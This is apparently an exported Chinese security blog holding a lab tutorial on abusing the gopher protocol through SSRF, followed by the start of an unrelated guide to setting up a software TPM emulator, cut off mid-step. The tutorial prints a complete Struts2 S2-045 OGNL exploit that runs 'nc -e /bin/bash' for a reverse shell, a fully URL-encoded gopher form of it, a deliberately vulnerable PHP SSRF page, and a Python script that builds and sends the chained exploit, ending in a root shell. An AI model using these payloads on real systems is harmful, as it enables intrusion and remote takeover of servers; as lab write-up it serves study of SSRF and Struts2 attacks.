<figure data-size="normal"><img src="https://pic2.zhimg.com/80/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.png" data-caption="" data-size="normal" data-rawwidth="1314" data-rawheight="162" class="origin_image zh-lightbox-thumb lazy" width="1314" data-original="https://pic2.zhimg.com/v2-ea9bb9538044933ac3c918d5a56f2d69_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-ea9bb9538044933ac3c918d5a56f2d69_b.png" data-lazy-status="ok"></figure>

<blockquote>
<p>–wite-curlwrappers：运用curl工具打开url流<br>curl使用curl –version查看版本以及支持的协议</p>
</blockquote>
<figure data-size="normal"><img src="https://pic1.zhimg.com/80/v2-4953b80e5cfdf51190f0e3f7b630b7e4_720w.png" data-caption="" data-size="normal" data-rawwidth="1132" data-rawheight="168" class="origin_image zh-lightbox-thumb lazy" width="1132" data-original="https://pic1.zhimg.com/v2-4953b80e5cfdf51190f0e3f7b630b7e4_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-4953b80e5cfdf51190f0e3f7b630b7e4_b.png" data-lazy-status="ok"></figure>

<p><strong>Gopher协议格式</strong>：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>gopher的默认端口是70</li>
<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
</ul>
<p><strong>Gopher发送请求HTTP GET请求：</strong></p>
<p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p>
<p>nc启动监听，监听2333端口：nc -lp 2333</p>
<p>使用curl发送http请求，命令为</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">margine:~ margin$ curl gopher:<span class="comment">//192.168.0.119:2333/abcd</span></span><br></pre></td></tr></tbody></table></figure>

<p>此时nc收到的消息为：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">margine:~ margin$ nc -lp 2333</span><br><span class="line">bcd2333</span><br><span class="line">bcd</span><br><span class="line">bcd</span><br></pre></td></tr></tbody></table></figure>

<p>可以发现url中的a没有被nc接受到，如果命令变为</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">margine:~ margin$ curl gopher://192.168.0.119:2333/_abcd</span><br></pre></td></tr></tbody></table></figure>

<p>此时nc收到的消息为：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">margine:~ margin$ nc -lp 2333</span><br><span class="line">abcd</span><br></pre></td></tr></tbody></table></figure>

<p>所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）</p>
<p>那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：</p>
<blockquote>
<p>1、构造HTTP数据包<br>2、URL编码、替换回车换行为%0d%0a<br>3、发送gopher协议</p>
</blockquote>
<p>我准备了一个PHP的代码，如下：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hello "</span>.$_GET[<span class="string">"name"</span>].<span class="string">"\n"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>一个GET型的HTTP包，如下：</p>
<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ssrf/base/get.php?name=Margin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.0.109</span><br></pre></td></tr></tbody></table></figure>

<p>URL编码后为：</p>
<figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_GET+/ssrf/base/get.php%3fname=Margin+HTTP/1.1%0d%0AHost:+192.168.0.109%0d%0A</span><br></pre></td></tr></tbody></table></figure>

<p>在转换为URL编码时候有这么几个坑</p>
<blockquote>
<p>1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>
</blockquote>
<p><strong>Gopher发送请求HTTP POST请求：</strong></p>
<p>发送POST请求前，先看下POST数据包的格式</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">POST /ssrf/base/post.php HTTP/1.1</span><br><span class="line">host:192.168.0.109</span><br><span class="line"></span><br><span class="line">name=Margin</span><br></pre></td></tr></tbody></table></figure>

<p>那我们将上面的POST数据包进行URL编码并改为gopher协议</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_POST+/ssrf/base/post.php+HTTP/1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname=Margin%0d%0A</span><br></pre></td></tr></tbody></table></figure>

<p>post.php的代码为</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo "Hello ".$_POST["name"]."\n"</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>使用curl发起gopher的POST请求后，结果为：</p>
<figure data-size="normal"><img src="https://pic2.zhimg.com/80/v2-2a42359e724822587a8f7026b9481d61_720w.jpg" data-caption="" data-size="normal" data-rawwidth="2243" data-rawheight="820" class="origin_image zh-lightbox-thumb lazy" width="2243" data-original="https://pic2.zhimg.com/v2-2a42359e724822587a8f7026b9481d61_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-2a42359e724822587a8f7026b9481d61_b.jpg" data-lazy-status="ok"></figure>

<p>根据上图发现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] "POST /ssrf/base/post.php HTTP/1.1" 200 7</span><br><span class="line">192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] "name=Margin" 501 213</span><br><span class="line">[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name=Margin</span><br></pre></td></tr></tbody></table></figure>

<p>这里有个疑问：为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">POST /ssrf/base/post.php HTTP/1.1</span><br><span class="line">host:192.168.0.109</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:11</span><br><span class="line"></span><br><span class="line">name=Margin</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们将它进行URL编码：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_POST+/ssrf/base/post.php+HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A</span><br></pre></td></tr></tbody></table></figure>

<p>再次发送请求的结果为：</p>
<figure data-size="normal"><img src="https://pic4.zhimg.com/80/v2-571b29ad1c7922b652a783160e5a8d77_720w.jpg" data-caption="" data-size="normal" data-rawwidth="2243" data-rawheight="510" class="origin_image zh-lightbox-thumb lazy" width="2243" data-original="https://pic4.zhimg.com/v2-571b29ad1c7922b652a783160e5a8d77_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-571b29ad1c7922b652a783160e5a8d77_b.jpg" data-lazy-status="ok"></figure>

<p>发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。</p>
<h2 id="二、如何使用gopher协议反弹shell？"><a href="#二、如何使用gopher协议反弹shell？" class="headerlink" title="二、如何使用gopher协议反弹shell？"></a>二、如何使用gopher协议反弹shell？</h2><p>Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架 (<strong><em>摘自百度百科</em></strong>)<br>今天我们用到的漏洞是Struts2-045漏洞，相信很多大佬不陌生，以下为S2-045漏洞反弹shell的利用代码，我们在本地机器上执行：nc -lp 6666</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">GET /S2-045/ HTTP/1.1</span><br><span class="line">Host: 192.168.0.119</span><br><span class="line">Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nc -e /bin/bash 192.168.0.119 6666').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span><br></pre></td></tr></tbody></table></figure>

<p>我们将其变为gopher所能使用的请求</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">curl gopher://192.168.0.119:8080/_GET+/S2-045/+HTTP/1.1%0d%0aHost:192.168.0.119%0d%0aContent-Type:%25%7b%28%23%5f%3d%27%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%27%29%2e%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%63%6d%64%3d%27%6e%63+%2d%65+%2f%62%69%6e%2f%62%61%73%68+%31%39%32%2e%31%36%38%2e%30%2e%31%31%39+%36%36%36%36%27%29%2e%28%23%69%73%77%69%6e%3d%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%40%67%65%74%50%72%6f%70%65%72%74%79%28%27%6f%73%2e%6e%61%6d%65%27%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%63%6f%6e%74%61%69%6e%73%28%27%77%69%6e%27%29%29%29%2e%28%23%63%6d%64%73%3d%28%23%69%73%77%69%6e%3f%7b%27%63%6d%64%2e%65%78%65%27%2c%27%2f%63%27%2c%23%63%6d%64%7d%3a%7b%27%2f%62%69%6e%2f%62%61%73%68%27%2c%27%2d%63%27%2c%23%63%6d%64%7d%29%29%2e%28%23%70%3d%6e%65%77+%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%23%63%6d%64%73%29%29%2e%28%23%70%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%29%2e%28%23%70%72%6f%63%65%73%73%3d%23%70%2e%73%74%61%72%74%28%29%29%2e%28%23%72%6f%73%3d%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%63%6f%70%79%28%23%70%72%6f%63%65%73%73%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%72%6f%73%29%29%2e%28%23%72%6f%73%2e%66%6c%75%73%68%28%29%29%7d%0d%0a</span><br></pre></td></tr></tbody></table></figure>

<p>一定要注意最后加上%0d%0a，以及很多URL编码工具将会回车换行转码为%0a，一定要自己替换为%0a%0d<br>发送请求后可以反弹shell</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">margine:~ margin$ nc -l 6666</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></tbody></table></figure>

<h2 id="三、在SSRF中如何使用gopher协议反弹shell"><a href="#三、在SSRF中如何使用gopher协议反弹shell" class="headerlink" title="三、在SSRF中如何使用gopher协议反弹shell?"></a>三、在SSRF中如何使用gopher协议反弹shell?</h2><ol>
<li>我们先准备了一个带有ssrf漏洞的页面，代码如下：</li>
</ol>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $curlobj = curl_init($url);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($curlobj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>这里需要注意的是，<strong>你的PHP版本必须大于等于5.3</strong>，并且在PHP.ini文件中开启了extension=php_curl.dll<br>2. 我在机器上开启了一个监听nc -lp 6666<br>然后在浏览器中访问：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到nc接收到了消息，没有问题。</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\桌面&gt;nc -lp 6666</span><br><span class="line">abc</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们想，如何使用SSRF漏洞配合gopher协议来获取shell呢？我们的环境如下(为了节省资源，攻击机和有漏洞的主机是一台机器，请见谅。)：</p>
<figure data-size="normal"><img src="https://pic4.zhimg.com/80/v2-2ab060bb11cb00070062196ac844f783_720w.jpg" data-caption="" data-size="normal" data-rawwidth="2243" data-rawheight="1228" class="origin_image zh-lightbox-thumb lazy" width="2243" data-original="https://pic4.zhimg.com/v2-2ab060bb11cb00070062196ac844f783_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-2ab060bb11cb00070062196ac844f783_b.jpg" data-lazy-status="ok"></figure>

<p>上图就不具体说了，是一个典型的ssrf利用的解释图。<br>在使用ssrf去获取struts2的shell时，遇到了两次困难：</p>
<ul>
<li>PHP的curl_exec函数没有发起gopher的请求（这个问题上面已经说过）</li>
<li>gopher一直请求不到目标页面</li>
</ul>
<p>根据我的试错经历，我梳理了下如何一步步的完成gopher请求获取shell。<br>首先我们先做一些简单的事情，顺序如下：</p>
<ol>
<li>使用ssrf漏洞发起gopher请求，访问前面用到的get.php</li>
<li>使用ssrf漏洞发起gopher请求，获取struts2主机的shell</li>
</ol>
<p><strong>第一步</strong>：<br>准备好访问get.php的数据包（<strong>照搬的本文开始的包</strong>）</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">gopher://192.168.0.109:80/_GET+/ssrf/base/get.php%3fname=Margin+HTTP/1.1%0d%0AHost:+192.168.0.109%0d%0A</span><br></pre></td></tr></tbody></table></figure>

<p>那我们现在是否可以这样来组成我们的URL？</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.109:80/_GET+/ssrf/base/get.php%3fname=Margin+HTTP/1.1%0d%0AHost:+192.168.0.109%0d%0A</span><br></pre></td></tr></tbody></table></figure>

<p>我们来测试下，结果如下：</p>
<figure data-size="normal"><img src="https://pic1.zhimg.com/80/v2-fdd9c111de1d846d2819b1b386517850_720w.png" data-caption="" data-size="normal" data-rawwidth="2243" data-rawheight="151" class="origin_image zh-lightbox-thumb lazy" width="2243" data-original="https://pic1.zhimg.com/v2-fdd9c111de1d846d2819b1b386517850_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-fdd9c111de1d846d2819b1b386517850_b.png" data-lazy-status="ok"></figure>

<p>发现并没有出现get页面的hello Margin，说明请求失败，这个地方卡了一会，发现是因为在PHP在接收到参数后会做一次URL的解码，正如我们上图所看到的，+等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。编码结果如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3A%2F%2F192.168.0.109%3A80%2F_GET%2520%2Fssrf%2Fbase%2Fget.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.0.109%250d%250A</span><br></pre></td></tr></tbody></table></figure>

<p>此时发起请求，得到如下结果：</p>
<figure data-size="normal"><img src="https://pic4.zhimg.com/80/v2-8998e4924db57867ec48add019d57733_720w.png" data-caption="" data-size="normal" data-rawwidth="2243" data-rawheight="166" class="origin_image zh-lightbox-thumb lazy" width="2243" data-original="https://pic4.zhimg.com/v2-8998e4924db57867ec48add019d57733_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-8998e4924db57867ec48add019d57733_b.png" data-lazy-status="ok"></figure>

<p>发现已经正常，此时便说明我们的环境没有问题，SSRF漏洞利用正常，开始接下来的步骤。</p>
<p><strong>第二步</strong>：<br>准备好struts2-045漏洞的利用代码，并进行二次编码，需要注意的是Content-Type中放了主要的漏洞利用代码，并且特殊字符多，将其单独进行编码，步骤如下：</p>
<ol>
<li>将gopher协议一直到Content-Type进行二次编码</li>
<li>将Content-Type的值所有字符进行URL二次编码<br>最终得到如下结果(太长，不列中间内容，省略部分为Content-type内容)：</li>
</ol>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">gopher%3A%2F%2F192.168.0.119%3A8080%2F_GET%2520%2FS2-045%2F%2520HTTP%2F1.1%250d%250aHost%3A192.168.0.119%250d%250aContent-Type%3A ......... %0d%0a</span><br></pre></td></tr></tbody></table></figure>

<p>最终可以获取shell，结果如下图：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">margine:~ margin$ nc -l 6666</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p><strong>再试错的过程中发现：URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码</strong></p>
</blockquote>
<p>最后附上编码脚本（python2.7）：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">import urllib2,urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.0.109/ssrf/base/curl_exec.php?url="</span></span><br><span class="line">header = <span class="string">""</span><span class="string">"gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host:192.168.0.119</span></span><br><span class="line"><span class="string">Content-Type:"</span><span class="string">""</span></span><br><span class="line">cmd = <span class="string">"nc -e /bin/bash 192.168.0.109 6666"</span></span><br><span class="line">content_type = <span class="string">""</span><span class="string">"自己填写(不要有换行)"</span><span class="string">""</span></span><br><span class="line">header_encoder = <span class="string">""</span></span><br><span class="line">content_type_encoder = <span class="string">""</span></span><br><span class="line">content_type_encoder_2 = <span class="string">""</span></span><br><span class="line">url_char = [<span class="string">" "</span>]</span><br><span class="line">nr = <span class="string">"\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码请求头</span></span><br><span class="line"><span class="keyword">for</span> single_char in header:</span><br><span class="line">    <span class="keyword">if</span> single_char in url_char:</span><br><span class="line">        header_encoder += urllib.quote(urllib.quote(single_char,<span class="string">'utf-8'</span>),<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        header_encoder += single_char</span><br><span class="line"></span><br><span class="line">header_encoder = header_encoder.replace(<span class="string">"\n"</span>,urllib.quote(urllib.quote(nr,<span class="string">'utf-8'</span>),<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码content-type，第一次编码</span></span><br><span class="line"><span class="keyword">for</span> single_char in content_type:</span><br><span class="line">    <span class="comment"># 先转为ASCII,在转十六进制即可变为URL编码</span></span><br><span class="line">    content_type_encoder += str(hex(ord(single_char)))</span><br><span class="line">content_type_encoder = content_type_encoder.replace(<span class="string">"0x"</span>,<span class="string">"%"</span>) + urllib.quote(nr,<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment"># 编码content-type，第二次编码</span></span><br><span class="line"><span class="keyword">for</span> single_char in content_type_encoder:</span><br><span class="line">    <span class="comment"># 先转为ASCII,在转十六进制即可变为URL编码</span></span><br><span class="line">    content_type_encoder_2 += str(hex(ord(single_char)))</span><br><span class="line">content_type_encoder_2 = content_type_encoder_2.replace(<span class="string">"0x"</span>,<span class="string">"%"</span>)</span><br><span class="line">exp = url + header_encoder + content_type_encoder_2</span><br><span class="line"><span class="keyword">print</span> exp</span><br><span class="line">request = urllib2.Request(exp)</span><br><span class="line">response = urllib2.urlopen(request).read()</span><br><span class="line"><span class="keyword">print</span> response</span><br></pre></td></tr></tbody></table></figure>

<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>h4x0r</tag>
        <tag>SSRF</tag>
        <tag>Gopher</tag>
      </tags>
  </entry>
  <entry>
    <title>TPM软件模拟环境搭建</title>
    <url>/posts/1903345210/</url>
    <content><![CDATA[<br>

<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>
#### 主要内容

<p>​    本文旨在记录当前没有硬件TPM的条件下，通过软件来模拟TPM的完整搭建过程。</p>
<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><ul>
<li>操作系统版本：Ubuntu 14.04</li>
<li>对应内核版本：Linux 3.13.0-24-generic</li>
<li>VMware 版本：VMware 10.0</li>
</ul>
<h4 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h4><ol>
<li><h5 id="创建ubuntu虚拟机"><a href="#创建ubuntu虚拟机" class="headerlink" title="创建ubuntu虚拟机"></a>创建ubuntu虚拟机</h5><p>使用VMware软件新建一台ubuntu虚拟机，此步骤相信大家不会陌生，此处不再介绍，具体搭建过程请参考该博客：<a href="https://blog.csdn.net/Andrewniu/article/details/88743846" target="_blank" rel="noopener"># VMware Ubuntu安装详细过程</a></p>
</li>
<li><h5 id="在创建好的虚拟机中安装cmake"><a href="#在创建好的虚拟机中安装cmake" class="headerlink" title="在创建好的虚拟机中安装cmake"></a>在创建好的虚拟机中安装cmake</h5><ul>
<li><p>提前下载好cmake-3.8.2.tar.gz压缩包，使用下面的命令进行安装，具体如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">tar -zxvf cmake-3.8.2.tar.gz</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>若提示缺少c编译器，可使用下面的命令解决：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>cd进入cmake目录，执行以下命令：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">./bootstrap &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
</li>
<li><h5 id="在创建好的虚拟机中安装gmp"><a href="#在创建好的虚拟机中安装gmp" class="headerlink" title="在创建好的虚拟机中安装gmp"></a>在创建好的虚拟机中安装gmp</h5><ul>
<li><p>提前下载好gmp-6.1.2.tar.lz压缩包，使用下面的命令进行安装，具体如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get install lzip</span><br><span class="line">lzip -d gmp-6.1.2.tar.lz</span><br><span class="line">tar -xvf gmp-6.1.2.tar</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>需使用下面的命令安装m4：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get install m4</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>cd进入gmp目录，执行以下命令：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">./configure &amp;&amp; make &amp;&amp; make check &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
</li>
<li><h5 id="在创建好的虚拟机中安装tpm-emulator"><a href="#在创建好的虚拟机中安装tpm-emulator" class="headerlink" title="在创建好的虚拟机中安装tpm_emulator"></a>在创建好的虚拟机中安装tpm_emulator</h5><ul>
<li><p>提前下载好tpm_emulator-0.7.4.tar.gz压缩包，使用下面的命令进行安装，具体如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">tar -zxvf tpm_emulator-0.7.4.tar.gz</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>cd进入tpm_emulator-0.7.4目录，执行以下命令：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">mkdir build</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>cd进入build目录，执行以下命令：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">cmake ../ &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>[注意] 若出现Module tpmd_dev not found，则先运行命令sudo depmod -a</p>
</li>
</ul>
</li>
<li><h5 id="在创建好的虚拟机中安装trouser-0-3-8"><a href="#在创建好的虚拟机中安装trouser-0-3-8" class="headerlink" title="在创建好的虚拟机中安装trouser-0.3.8"></a>在创建好的虚拟机中安装trouser-0.3.8</h5><ul>
<li><p>提前下载好trouser-0.3.8.tar.gz压缩包，使用下面的命令进行安装，具体如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">tar -zxvf trouser-0.3.8.tar.gz</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>cd进入trouser-0.3.8目录，执行以下命令：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">sudo vim ./src/tcsd/MakeFile.am</span><br></pre></td></tr></tbody></table></figure>

<p>修改./src/tcsd/Makefile.am第4行如下：tcsd_LDADD=${top_builddir}/src/tcs/libtcs.a /usr/local/lib/libtddl.so -lpthread @CRYPTOLIB@</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">sudo vim ./src/tcsd/MakeFile.in</span><br></pre></td></tr></tbody></table></figure>

<p>修改./src/tcsd/Makefile.in第55，56行如下:tcsd_DEPENDENCIES=${top_builddir}/src/tcs/libtcs.a /usr/local/lib/libtddl.so</p>
</li>
<li><p>修改完成后执行以下命令：</p>
